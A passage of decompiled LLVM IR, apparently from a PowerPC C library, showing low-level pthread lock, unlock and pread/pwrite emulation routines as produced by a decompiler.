  %v3_100182fc = load i32, i32* @global_var_10045224.1121, align 4
  store i32 %v3_100182fc, i32* %r0.global-to-local, align 4
  %v3_10018300 = icmp eq i32 %v3_100182fc, 0
  br i1 %v3_10018300, label %dec_label_pc_10018314, label %dec_label_pc_10018308

dec_label_pc_10018308:                            ; preds = %entry
  store i32 %v3_100182fc, i32* @r31, align 4
  %v1_1001830c = inttoptr i32 %v3_100182fc to i32*
  %v2_1001830c = load i32, i32* %v1_1001830c, align 4
  store i32 %v2_1001830c, i32* %r0.global-to-local, align 4
  store i32 %v2_1001830c, i32* @global_var_10045224.1121, align 4
  br label %dec_label_pc_10018314

dec_label_pc_10018314:                            ; preds = %entry, %dec_label_pc_10018308
  %v0_1001833c.pr = phi i1 [ false, %dec_label_pc_10018308 ], [ true, %entry ]
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @global_var_10045228.1120, align 4
  br i1 %v0_1001833c.pr, label %dec_label_pc_1001833c, label %dec_label_pc_1001833c.thread

dec_label_pc_1001833c.thread:                     ; preds = %dec_label_pc_10018314
  br label %dec_label_pc_10018354

dec_label_pc_1001833c:                            ; preds = %dec_label_pc_10018314
  store i32 12, i32* @r3, align 4
  store i32 268534584, i32* @lr, align 4
  %v0_10018334 = call i32 @malloc()
  store i32 %v0_10018334, i32* @r31, align 4
  %v3_1001833c = icmp eq i32 %v0_10018334, 0
  br i1 %v3_1001833c, label %dec_label_pc_10018344, label %dec_label_pc_10018354

dec_label_pc_10018344:                            ; preds = %dec_label_pc_1001833c
  %v0_10018344 = load i32, i32* @r29, align 4
  %v0_10018348 = load i32, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_10018350.1123 to i32), i32* @lr, align 4
  %v2_1001834c = inttoptr i32 %v0_10018344 to i32*
  %v3_1001834c = call i32 @__pthread_alt_lock(i32* %v2_1001834c, i32 %v0_10018348)
  br label %dec_label_pc_10018404

dec_label_pc_10018354:                            ; preds = %dec_label_pc_1001833c, %dec_label_pc_1001833c.thread, %dec_label_pc_1001839c
  %v0_10018354 = load i32, i32* @r29, align 4
  %v1_10018354 = inttoptr i32 %v0_10018354 to i32*
  %v2_10018354 = load i32, i32* %v1_10018354, align 4
  store i32 %v2_10018354, i32* %r9.global-to-local, align 4
  %v0_10018358 = load i32, i32* @r30, align 4
  store i32 1, i32* @r11, align 4
  %v3_10018360 = icmp eq i32 %v2_10018354, 0
  br i1 %v3_10018360, label %dec_label_pc_10018354.dec_label_pc_10018378_crit_edge, label %dec_label_pc_10018368

dec_label_pc_10018354.dec_label_pc_10018378_crit_edge: ; preds = %dec_label_pc_10018354
  %v1_1001837c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10018388

dec_label_pc_10018368:                            ; preds = %dec_label_pc_10018354
  %v3_10018358 = icmp eq i32 %v0_10018358, 0
  br i1 %v3_10018358, label %dec_label_pc_1001836c, label %dec_label_pc_10018370

dec_label_pc_1001836c:                            ; preds = %dec_label_pc_10018368
  %v0_1001836c = load i32, i32* @r2, align 4
  store i32 %v0_1001836c, i32* @r30, align 4
  br label %dec_label_pc_10018370

dec_label_pc_10018370:                            ; preds = %dec_label_pc_10018368, %dec_label_pc_1001836c
  %v0_10018370 = phi i32 [ %v0_10018358, %dec_label_pc_10018368 ], [ %v0_1001836c, %dec_label_pc_1001836c ]
  %v1_10018370 = load i32, i32* @r31, align 4
  %v2_10018370 = add i32 %v1_10018370, 4
  %v3_10018370 = inttoptr i32 %v2_10018370 to i32*
  store i32 %v0_10018370, i32* %v3_10018370, align 4
  %v0_10018374 = load i32, i32* @r31, align 4
  store i32 %v0_10018374, i32* @r11, align 4
  %v0_1001837c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10018388

dec_label_pc_10018388:                            ; preds = %dec_label_pc_10018370, %dec_label_pc_10018354.dec_label_pc_10018378_crit_edge
  %v1_1001837c = phi i32 [ %v1_1001837c.pre, %dec_label_pc_10018354.dec_label_pc_10018378_crit_edge ], [ %v0_10018374, %dec_label_pc_10018370 ]
  %v0_1001837c = phi i32 [ 0, %dec_label_pc_10018354.dec_label_pc_10018378_crit_edge ], [ %v0_1001837c.pre, %dec_label_pc_10018370 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1001837c = inttoptr i32 %v1_1001837c to i32*
  store i32 %v0_1001837c, i32* %v2_1001837c, align 4
  %v0_10018380 = load i32, i32* %r0.global-to-local, align 4
  %v1_10018380 = load i32, i32* @r31, align 4
  %v2_10018380 = add i32 %v1_10018380, 8
  %v3_10018380 = inttoptr i32 %v2_10018380 to i32*
  store i32 %v0_10018380, i32* %v3_10018380, align 4
  %v0_1001838c = load i32, i32* %r9.global-to-local, align 4
  %r0.promoted = load i32, i32* %r0.global-to-local, align 4
  %.pre = xor i32 %r0.promoted, %v0_1001838c
  %v5_1001838c = icmp eq i32 %.pre, 0
  br i1 %v5_1001838c, label %dec_label_pc_100183a8, label %dec_label_pc_1001839c

dec_label_pc_1001839c:                            ; preds = %dec_label_pc_10018388
  store i32 %.pre, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10018354

dec_label_pc_100183a8:                            ; preds = %dec_label_pc_10018388
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_100183a8 = icmp eq i32 %v0_1001838c, 0
  br i1 %v3_100183a8, label %dec_label_pc_100183f8, label %dec_label_pc_100183b0

dec_label_pc_100183b0:                            ; preds = %dec_label_pc_100183a8
  %v0_100183b0 = load i32, i32* @r28, align 4
  %v0_100183b4 = load i32, i32* @r30, align 4
  store i32 268534716, i32* @lr, align 4
  %v2_100183b8 = inttoptr i32 %v0_100183b0 to i32*
  %v3_100183b8 = call i32 @__pthread_timedsuspend_new(i32 %v0_100183b4, i32* %v2_100183b8)
  %v3_100183bc = icmp eq i32 %v3_100183b8, 0
  br i1 %v3_100183bc, label %dec_label_pc_100183cc, label %dec_label_pc_100183f8

dec_label_pc_100183cc:                            ; preds = %dec_label_pc_100183b0
  %v0_100183c4 = load i32, i32* @r31, align 4
  %v1_100183c4 = add i32 %v0_100183c4, 8
  store i32 %v1_100183c4, i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %r11.promoted = load i32, i32* @r11, align 4
  %v5_100183d0 = icmp eq i32 %r11.promoted, 0
  br i1 %v5_100183d0, label %dec_label_pc_10018408, label %dec_label_pc_100183f0

dec_label_pc_100183f0:                            ; preds = %dec_label_pc_100183cc
  %v0_100183f0 = load i32, i32* @r30, align 4
  store i32 %v0_100183f0, i32* @r3, align 4
  store i32 268534776, i32* @lr, align 4
  %v0_100183f4 = call i32 @suspend.10()
  br label %dec_label_pc_100183f8

dec_label_pc_100183f8:                            ; preds = %dec_label_pc_100183b0, %dec_label_pc_100183a8, %dec_label_pc_100183f0
  %v0_100183f8 = load i32, i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_10018400.1124 to i32), i32* @lr, align 4
  %v1_100183fc = inttoptr i32 %v0_100183f8 to i32*
  %v2_100183fc = call i32 @wait_node_free(i32* %v1_100183fc)
  br label %dec_label_pc_10018404

dec_label_pc_10018404:                            ; preds = %dec_label_pc_10018344, %dec_label_pc_100183f8
  br label %dec_label_pc_10018408

dec_label_pc_10018408:                            ; preds = %dec_label_pc_100183cc, %dec_label_pc_10018404
  %v0_10018418 = phi i32 [ 0, %dec_label_pc_100183cc ], [ 1, %dec_label_pc_10018404 ]
  store i32 %v0_100182d0, i32* %r0.global-to-local, align 4
  ret i32 %v0_10018418

; uselistorder directives
  uselistorder i32 %v3_100182fc, { 1, 0, 2, 3 }
  uselistorder i32* %r9.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 9, 10, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 (i32, i32*)* @__pthread_timedsuspend_new, { 1, 0, 2 }
  uselistorder i32 (i32)* @__pthread_acquire, { 1, 0 }
  uselistorder label %dec_label_pc_10018408, { 1, 0 }
  uselistorder label %dec_label_pc_10018404, { 1, 0 }
  uselistorder label %dec_label_pc_100183f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10018370, { 1, 0 }
  uselistorder label %dec_label_pc_10018354, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10018314, { 1, 0 }
}

define i32 @__pthread_unlock() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1001841c = load i32, i32* @lr, align 4
  br label %dec_label_pc_10018454

dec_label_pc_10018438:                            ; preds = %dec_label_pc_10018454
  %.pre = xor i32 %r0.promoted, 1
  %v5_1001843c = icmp eq i32 %.pre, 0
  br i1 %v5_1001843c, label %dec_label_pc_10018524, label %dec_label_pc_10018454

dec_label_pc_10018454:                            ; preds = %dec_label_pc_100184b8, %dec_label_pc_10018438, %entry
  %r0.promoted = phi i32 [ %v0_1001841c, %entry ], [ %.pre, %dec_label_pc_10018438 ], [ %v1_100184b0, %dec_label_pc_100184b8 ]
  %v0_10018454 = load i32, i32* @r3, align 4
  %v1_10018454 = inttoptr i32 %v0_10018454 to i32*
  %v2_10018454 = load i32, i32* %v1_10018454, align 4
  store i32 %v2_10018454, i32* @r10, align 4
  %v3_10018458 = icmp eq i32 %v2_10018454, 1
  br i1 %v3_10018458, label %dec_label_pc_10018438, label %dec_label_pc_10018460

dec_label_pc_10018460:                            ; preds = %dec_label_pc_10018454
  %v1_10018460 = call i32 @__asm_rlwinm(i32 %v2_10018454, i32 0, i32 0, i32 30)
  store i32 %v1_10018460, i32* @r8, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_10018460, i32* %r9.global-to-local, align 4
  %v0_10018470 = load i32, i32* @r3, align 4
  store i32 %v0_10018470, i32* %r7.global-to-local, align 4
  store i32 %v0_10018470, i32* @r11, align 4
  %v3_1001849c4 = icmp eq i32 %v1_10018460, 0
  br i1 %v3_1001849c4, label %dec_label_pc_100184a4.thread, label %dec_label_pc_1001847c

dec_label_pc_100184a4.thread:                     ; preds = %dec_label_pc_10018460
  br label %dec_label_pc_100184b8

dec_label_pc_1001847c:                            ; preds = %dec_label_pc_10018460, %dec_label_pc_10018490.dec_label_pc_1001847c_crit_edge
  %v1_10018480 = phi i32 [ %v1_10018480.pre, %dec_label_pc_10018490.dec_label_pc_1001847c_crit_edge ], [ 0, %dec_label_pc_10018460 ]
  %v0_10018490 = phi i32 [ %v1_10018498, %dec_label_pc_10018490.dec_label_pc_1001847c_crit_edge ], [ %v1_10018460, %dec_label_pc_10018460 ]
  %v1_1001847c = add i32 %v0_10018490, 24
  %v2_1001847c = inttoptr i32 %v1_1001847c to i32*
  %v3_1001847c = load i32, i32* %v2_1001847c, align 4
  %v2_10018480 = icmp slt i32 %v3_1001847c, %v1_10018480
  br i1 %v2_10018480, label %dec_label_pc_10018490, label %dec_label_pc_10018488

dec_label_pc_10018488:                            ; preds = %dec_label_pc_1001847c
  store i32 %v3_1001847c, i32* %r6.global-to-local, align 4
  %v0_1001848c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1001848c, i32* @r11, align 4
  br label %dec_label_pc_10018490

dec_label_pc_10018490:                            ; preds = %dec_label_pc_1001847c, %dec_label_pc_10018488
  %v1_10018490 = add i32 %v0_10018490, 12
  %v2_10018490 = inttoptr i32 %v1_10018490 to i32*
  %v3_10018490 = load i32, i32* %v2_10018490, align 4
  store i32 %v1_10018490, i32* %r7.global-to-local, align 4
  %v1_10018498 = call i32 @__asm_rlwinm(i32 %v3_10018490, i32 0, i32 0, i32 30)
  store i32 %v1_10018498, i32* %r9.global-to-local, align 4
  %v3_1001849c = icmp eq i32 %v1_10018498, 0
  br i1 %v3_1001849c, label %dec_label_pc_100184a4, label %dec_label_pc_10018490.dec_label_pc_1001847c_crit_edge

dec_label_pc_10018490.dec_label_pc_1001847c_crit_edge: ; preds = %dec_label_pc_10018490
  %v1_10018480.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1001847c

dec_label_pc_100184a4:                            ; preds = %dec_label_pc_10018490
  %v0_100184a4.pre = load i32, i32* @r11, align 4
  %v1_100184a4.pre = load i32, i32* @r3, align 4
  %v4_100184a4 = icmp eq i32 %v0_100184a4.pre, %v1_100184a4.pre
  br i1 %v4_100184a4, label %dec_label_pc_100184a4.dec_label_pc_100184b8_crit_edge, label %dec_label_pc_100184d8

dec_label_pc_100184a4.dec_label_pc_100184b8_crit_edge: ; preds = %dec_label_pc_100184a4
  %v0_100184ac.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_100184b8

dec_label_pc_100184b8:                            ; preds = %dec_label_pc_100184a4.dec_label_pc_100184b8_crit_edge, %dec_label_pc_100184a4.thread
  %v0_100184ac = phi i32 [ %v0_100184ac.pre, %dec_label_pc_100184a4.dec_label_pc_100184b8_crit_edge ], [ 0, %dec_label_pc_100184a4.thread ]
  %v1_100184ac = add i32 %v0_100184ac, 12
  %v2_100184ac = inttoptr i32 %v1_100184ac to i32*
  %v3_100184ac = load i32, i32* %v2_100184ac, align 4
  %v1_100184b0 = call i32 @__asm_rlwinm(i32 %v3_100184ac, i32 0, i32 0, i32 30)
  %r9.promoted = load i32, i32* %r9.global-to-local, align 4
  %.pre14 = xor i32 %r9.promoted, %v2_10018454
  %v5_100184bc = icmp eq i32 %.pre14, 0
  store i32 %.pre14, i32* @r9, align 4
  br i1 %v5_100184bc, label %dec_label_pc_10018514, label %dec_label_pc_10018454

dec_label_pc_100184d8:                            ; preds = %dec_label_pc_100184a4
  %v1_100184d8 = inttoptr i32 %v0_100184a4.pre to i32*
  %v2_100184d8 = load i32, i32* %v1_100184d8, align 4
  %v1_100184dc = call i32 @__asm_rlwinm(i32 %v2_100184d8, i32 0, i32 0, i32 30)
  store i32 %v1_100184dc, i32* @r8, align 4
  %v1_100184e0 = add i32 %v1_100184dc, 12
  %v2_100184e0 = inttoptr i32 %v1_100184e0 to i32*
  %v3_100184e0 = load i32, i32* %v2_100184e0, align 4
  %v1_100184e4 = load i32, i32* @r11, align 4
  %v2_100184e4 = inttoptr i32 %v1_100184e4 to i32*
  store i32 %v3_100184e0, i32* %v2_100184e4, align 4
  br label %dec_label_pc_100184f8

dec_label_pc_100184f8:                            ; preds = %dec_label_pc_100184d8, %dec_label_pc_100184f8
  %v0_100184ec = load i32, i32* @r3, align 4
  %v1_100184ec = inttoptr i32 %v0_100184ec to i32*
  %v2_100184ec = load i32, i32* %v1_100184ec, align 4
  store i32 %v2_100184ec, i32* %r9.global-to-local, align 4
  %v1_100184f4 = call i32 @__asm_rlwinm(i32 %v2_100184ec, i32 0, i32 0, i32 30)
  %r11.promoted = load i32, i32* @r11, align 4
  %.pre15 = xor i32 %r11.promoted, %v2_100184ec
  %v5_100184fc = icmp eq i32 %.pre15, 0
  store i32 %.pre15, i32* @r11, align 4
  br i1 %v5_100184fc, label %dec_label_pc_10018514, label %dec_label_pc_100184f8

dec_label_pc_10018514:                            ; preds = %dec_label_pc_100184b8, %dec_label_pc_100184f8
  %v0_10018518 = load i32, i32* @r8, align 4
  store i32 %v0_10018518, i32* @r3, align 4
  %v2_1001851c = add i32 %v0_10018518, 12
  %v3_1001851c = inttoptr i32 %v2_1001851c to i32*
  store i32 0, i32* %v3_1001851c, align 4
  store i32 268535076, i32* @lr, align 4
  %v1_10018520 = call i32 @restart.9(i32 %v0_10018518)
  br label %dec_label_pc_10018524

dec_label_pc_10018524:                            ; preds = %dec_label_pc_10018438, %dec_label_pc_10018514
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10018498, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10018524, { 1, 0 }
  uselistorder label %dec_label_pc_10018514, { 1, 0 }
  uselistorder label %dec_label_pc_100184f8, { 1, 0 }
  uselistorder label %dec_label_pc_10018490, { 1, 0 }
  uselistorder label %dec_label_pc_1001847c, { 1, 0 }
}

define i32 @__pthread_lock() local_unnamed_addr {
entry:
  %v0_10018544 = load i32, i32* @r3, align 4
  store i32 %v0_10018544, i32* @r30, align 4
  %v0_1001854c = load i32, i32* @r4, align 4
  store i32 %v0_1001854c, i32* @r31, align 4
  %v1_10018550 = inttoptr i32 %v0_10018544 to i32*
  %v2_10018550 = load i32, i32* %v1_10018550, align 4
  store i32 %v2_10018550, i32* @r9, align 4
  %v3_10018554 = icmp eq i32 %v2_10018550, 0
  br i1 %v3_10018554, label %dec_label_pc_10018560, label %dec_label_pc_10018580

dec_label_pc_10018560:                            ; preds = %entry
  %r10.promoted10 = load i32, i32* @r10, align 4
  %v5_10018564 = icmp eq i32 %r10.promoted10, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v5_10018564, label %dec_label_pc_10018618, label %dec_label_pc_10018580

dec_label_pc_10018580:                            ; preds = %entry, %dec_label_pc_10018560
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10018584

dec_label_pc_10018584:                            ; preds = %dec_label_pc_10018584.backedge, %dec_label_pc_10018580
  %v0_100185ac.pr = phi i32 [ %v0_100185ac.pr.pre, %dec_label_pc_10018584.backedge ], [ %v0_1001854c, %dec_label_pc_10018580 ]
  %v0_10018584 = phi i32 [ %v0_10018584.pre, %dec_label_pc_10018584.backedge ], [ %v0_10018544, %dec_label_pc_10018580 ]
  %v1_10018584 = inttoptr i32 %v0_10018584 to i32*
  %v2_10018584 = load i32, i32* %v1_10018584, align 4
  store i32 %v2_10018584, i32* @r9, align 4
  store i32 1, i32* @r11, align 4
  %v1_1001858c = urem i32 %v2_10018584, 2
  %v3_1001858c = icmp eq i32 %v1_1001858c, 0
  br i1 %v3_1001858c, label %dec_label_pc_100185ac, label %dec_label_pc_10018598

dec_label_pc_10018598:                            ; preds = %dec_label_pc_10018584
  %v3_10018598 = icmp eq i32 %v0_100185ac.pr, 0
  br i1 %v3_10018598, label %dec_label_pc_100185a0, label %dec_label_pc_100185a4

dec_label_pc_100185a0:                            ; preds = %dec_label_pc_10018598
  %v0_100185a0 = load i32, i32* @r2, align 4
  store i32 %v0_100185a0, i32* @r31, align 4
  br label %dec_label_pc_100185a4

dec_label_pc_100185a4:                            ; preds = %dec_label_pc_10018598, %dec_label_pc_100185a0
  %v0_100185a4 = phi i32 [ %v0_100185ac.pr, %dec_label_pc_10018598 ], [ %v0_100185a0, %dec_label_pc_100185a0 ]
  store i32 0, i32* @r11, align 4
  br label %dec_label_pc_100185ac

dec_label_pc_100185ac:                            ; preds = %dec_label_pc_10018584, %dec_label_pc_100185a4
  %v1_100185b4 = phi i32 [ %v0_100185a4, %dec_label_pc_100185a4 ], [ %v0_100185ac.pr, %dec_label_pc_10018584 ]
  %v3_100185ac = icmp eq i32 %v1_100185b4, 0
  br i1 %v3_100185ac, label %dec_label_pc_100185bc, label %dec_label_pc_100185b4

dec_label_pc_100185b4:                            ; preds = %dec_label_pc_100185ac
  %v2_100185b4 = add i32 %v1_100185b4, 12
  %v3_100185b4 = inttoptr i32 %v2_100185b4 to i32*
  store i32 %v2_10018584, i32* %v3_100185b4, align 4
  %v0_100185c0.pre = load i32, i32* @r9, align 4
  br label %dec_label_pc_100185bc

dec_label_pc_100185bc:                            ; preds = %dec_label_pc_100185ac, %dec_label_pc_100185b4
  %v0_100185c0 = phi i32 [ %v0_100185c0.pre, %dec_label_pc_100185b4 ], [ %v2_10018584, %dec_label_pc_100185ac ]
  %r10.promoted = load i32, i32* @r10, align 4
  %.pre = xor i32 %r10.promoted, %v0_100185c0
  %v5_100185c0 = icmp eq i32 %.pre, 0
  store i32 %.pre, i32* @r10, align 4
  store i1 false, i1* @cr0_so, align 1
  br i1 %v5_100185c0, label %dec_label_pc_100185dc, label %dec_label_pc_100185d0.dec_label_pc_10018584.backedge_crit_edge

dec_label_pc_100185d0.dec_label_pc_10018584.backedge_crit_edge: ; preds = %dec_label_pc_100185bc
  %v0_100185ac.pr.pre.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10018584.backedge

dec_label_pc_10018584.backedge:                   ; preds = %dec_label_pc_100185e4, %dec_label_pc_100185d0.dec_label_pc_10018584.backedge_crit_edge
  %v0_100185ac.pr.pre = phi i32 [ %v0_100185ac.pr.pre.pre, %dec_label_pc_100185d0.dec_label_pc_10018584.backedge_crit_edge ], [ %v0_100185ec, %dec_label_pc_100185e4 ]
  %v0_10018584.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10018584

dec_label_pc_100185dc:                            ; preds = %dec_label_pc_100185bc
  %v0_100185dc = load i32, i32* @r11, align 4
  %v3_100185dc = icmp eq i32 %v0_100185dc, 0
  br i1 %v3_100185dc, label %dec_label_pc_100185e4.preheader, label %dec_label_pc_10018604.preheader

dec_label_pc_100185e4.preheader:                  ; preds = %dec_label_pc_100185dc
  %v0_100185e4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100185e4

dec_label_pc_10018604.preheader:                  ; preds = %dec_label_pc_100185dc
  %v0_100186041 = load i32, i32* @r29, align 4
  %v3_100186044 = icmp eq i32 %v0_100186041, 0
  %v0_100186085 = load i32, i32* @r31, align 4
  store i32 %v0_100186085, i32* @r3, align 4
  %v1_1001860c7 = add i32 %v0_100186041, -1
  store i32 %v1_1001860c7, i32* @r29, align 4
  br i1 %v3_100186044, label %dec_label_pc_10018618, label %dec_label_pc_10018600

dec_label_pc_100185e4:                            ; preds = %dec_label_pc_100185e4.preheader, %dec_label_pc_100185f8
  %v0_100185e4 = phi i32 [ %v0_100185e4.pre, %dec_label_pc_100185e4.preheader ], [ %v0_100185ec, %dec_label_pc_100185f8 ]
  store i32 %v0_100185e4, i32* @r3, align 4
  store i32 268535276, i32* @lr, align 4
  %v0_100185e8 = call i32 @suspend.10()
  %v0_100185ec = load i32, i32* @r31, align 4
  %v1_100185ec = add i32 %v0_100185ec, 12
  %v2_100185ec = inttoptr i32 %v1_100185ec to i32*
  %v3_100185ec = load i32, i32* %v2_100185ec, align 4
  %v3_100185f0 = icmp eq i32 %v3_100185ec, 0
  br i1 %v3_100185f0, label %dec_label_pc_10018584.backedge, label %dec_label_pc_100185f8

dec_label_pc_100185f8:                            ; preds = %dec_label_pc_100185e4
  br label %dec_label_pc_100185e4

dec_label_pc_10018600:                            ; preds = %dec_label_pc_10018604.preheader, %dec_label_pc_10018600
  %v0_100186088 = phi i32 [ %v0_10018608, %dec_label_pc_10018600 ], [ %v0_100186085, %dec_label_pc_10018604.preheader ]
  store i32 268535300, i32* @lr, align 4
  %v1_10018600 = call i32 @restart.9(i32 %v0_100186088)
  %v0_10018604 = load i32, i32* @r29, align 4
  %v3_10018604 = icmp eq i32 %v0_10018604, 0
  %v0_10018608 = load i32, i32* @r31, align 4
  store i32 %v0_10018608, i32* @r3, align 4
  %v1_1001860c = add i32 %v0_10018604, -1
  store i32 %v1_1001860c, i32* @r29, align 4
  br i1 %v3_10018604, label %dec_label_pc_10018618, label %dec_label_pc_10018600

dec_label_pc_10018618:                            ; preds = %dec_label_pc_10018600, %dec_label_pc_10018604.preheader, %dec_label_pc_10018560
  %.0 = phi i32 [ undef, %dec_label_pc_10018560 ], [ %v0_100186085, %dec_label_pc_10018604.preheader ], [ %v0_10018608, %dec_label_pc_10018600 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_10018608, { 0, 2, 1 }
  uselistorder i32 %v0_100185ec, { 2, 0, 1 }
  uselistorder i32 %v0_100186085, { 1, 0, 2 }
  uselistorder i32 %v2_10018584, { 1, 2, 0, 3 }
  uselistorder i32 %v0_100185ac.pr, { 2, 0, 1 }
  uselistorder i32 ()* @suspend.10, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10018600, { 1, 0 }
  uselistorder label %dec_label_pc_100185e4, { 1, 0 }
  uselistorder label %dec_label_pc_100185bc, { 1, 0 }
  uselistorder label %dec_label_pc_100185ac, { 1, 0 }
  uselistorder label %dec_label_pc_100185a4, { 1, 0 }
  uselistorder label %dec_label_pc_10018580, { 1, 0 }
}

define i32 @__fake_pread_write64(i32 %arg1) local_unnamed_addr {
entry:
  %r24.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %v0_1001863c = load i32, i32* @r7, align 4
  store i32 %v0_1001863c, i32* %r28.global-to-local, align 4
  %v0_10018650 = load i32, i32* @r8, align 4
  store i32 %v0_10018650, i32* %r29.global-to-local, align 4
  %v0_10018654 = load i32, i32* @r4, align 4
  store i32 %v0_10018654, i32* %r26.global-to-local, align 4
  %v0_10018658 = load i32, i32* @r9, align 4
  store i32 %v0_10018658, i32* %r24.global-to-local, align 4
  store i32 %arg1, i32* %r27.global-to-local, align 4
  store i32 268535396, i32* @lr, align 4
  %v4_10018660 = call i32 @__libc_lseek64(i32 0, i32 0, i32 1, i32 0)
  store i32 %v4_10018660, i32* %r30.global-to-local, align 4
  %v0_10018668 = load i32, i32* @r4, align 4
  store i32 %v0_10018668, i32* @r31, align 4
  %v3_1001866c = icmp eq i32 %v4_10018660, -1
  br i1 %v3_1001866c, label %dec_label_pc_10018674, label %dec_label_pc_1001867c

dec_label_pc_10018674:                            ; preds = %entry
  %v3_10018674 = icmp eq i32 %v0_10018668, -1
  br i1 %v3_10018674, label %dec_label_pc_10018710, label %dec_label_pc_1001867c

dec_label_pc_1001867c:                            ; preds = %entry, %dec_label_pc_10018674
  %v0_1001867c = load i32, i32* %r28.global-to-local, align 4
  %v0_10018680 = load i32, i32* %r29.global-to-local, align 4
  %v0_10018684 = load i32, i32* %r27.global-to-local, align 4
  store i32 268535440, i32* @lr, align 4
  %v4_1001868c = call i32 @__libc_lseek64(i32 %v0_10018684, i32 %v0_1001867c, i32 %v0_10018680, i32 0)
  %v3_10018690 = icmp eq i32 %v4_1001868c, -1
  br i1 %v3_10018690, label %dec_label_pc_10018698, label %dec_label_pc_100186a0

dec_label_pc_10018698:                            ; preds = %dec_label_pc_1001867c
  %v0_10018698 = load i32, i32* @r4, align 4
  %v3_10018698 = icmp eq i32 %v0_10018698, -1
  br i1 %v3_10018698, label %dec_label_pc_10018710, label %dec_label_pc_100186a0

dec_label_pc_100186a0:                            ; preds = %dec_label_pc_1001867c, %dec_label_pc_10018698
  %v0_100186a0 = load i32, i32* %r24.global-to-local, align 4
  %v3_100186a0 = icmp eq i32 %v0_100186a0, 1
  %v0_100186b0 = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_100186a0, label %dec_label_pc_100186a8, label %dec_label_pc_100186bc

dec_label_pc_100186a8:                            ; preds = %dec_label_pc_100186a0
  %v0_100186a8 = load i32, i32* %r26.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100186b8.1125 to i32), i32* @lr, align 4
  %v2_100186b4 = call i32 @__libc_write(i32 %v0_100186b0, i32 %v0_100186a8)
  br label %dec_label_pc_100186cc

dec_label_pc_100186bc:                            ; preds = %dec_label_pc_100186a0
  store i32 268535500, i32* @lr, align 4
  %v1_100186c8 = call i32 @__libc_read(i32 %v0_100186b0)
  br label %dec_label_pc_100186cc

dec_label_pc_100186cc:                            ; preds = %dec_label_pc_100186a8, %dec_label_pc_100186bc
  %storemerge = phi i32 [ %v1_100186c8, %dec_label_pc_100186bc ], [ %v2_100186b4, %dec_label_pc_100186a8 ]
  store i32 %storemerge, i32* %r28.global-to-local, align 4
  %v0_100186d0 = call i32 @__errno_location()
  store i32 %v0_100186d0, i32* %r29.global-to-local, align 4
  %v0_100186d8 = load i32, i32* @r31, align 4
  %v0_100186dc = load i32, i32* %r30.global-to-local, align 4
  %v0_100186e0 = load i32, i32* %r27.global-to-local, align 4
  %v1_100186e8 = inttoptr i32 %v0_100186d0 to i32*
  %v2_100186e8 = load i32, i32* %v1_100186e8, align 4
  store i32 %v2_100186e8, i32* @r31, align 4
  store i32 268535536, i32* @lr, align 4
  %v4_100186ec = call i32 @__libc_lseek64(i32 %v0_100186e0, i32 %v0_100186dc, i32 %v0_100186d8, i32 0)
  %v3_100186f0 = icmp eq i32 %v4_100186ec, -1
  br i1 %v3_100186f0, label %dec_label_pc_100186f8, label %dec_label_pc_10018708

dec_label_pc_100186f8:                            ; preds = %dec_label_pc_100186cc
  %v0_100186f8 = load i32, i32* @r4, align 4
  %v3_100186f8 = icmp eq i32 %v0_100186f8, -1
  br i1 %v3_100186f8, label %dec_label_pc_10018700, label %dec_label_pc_10018708

dec_label_pc_10018700:                            ; preds = %dec_label_pc_100186f8
  %v0_10018700 = load i32, i32* %r28.global-to-local, align 4
  %v3_10018700 = icmp eq i32 %v0_10018700, -1
  br i1 %v3_10018700, label %dec_label_pc_10018708, label %dec_label_pc_10018710

dec_label_pc_10018708:                            ; preds = %dec_label_pc_10018700, %dec_label_pc_100186f8, %dec_label_pc_100186cc
  %v0_10018708 = load i32, i32* @r31, align 4
  %v1_10018708 = load i32, i32* %r29.global-to-local, align 4
  %v2_10018708 = inttoptr i32 %v1_10018708 to i32*
  store i32 %v0_10018708, i32* %v2_10018708, align 4
  %v0_10018718.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10018714

dec_label_pc_10018710:                            ; preds = %dec_label_pc_10018700, %dec_label_pc_10018698, %dec_label_pc_10018674
  store i32 -1, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10018714

dec_label_pc_10018714:                            ; preds = %dec_label_pc_10018708, %dec_label_pc_10018710
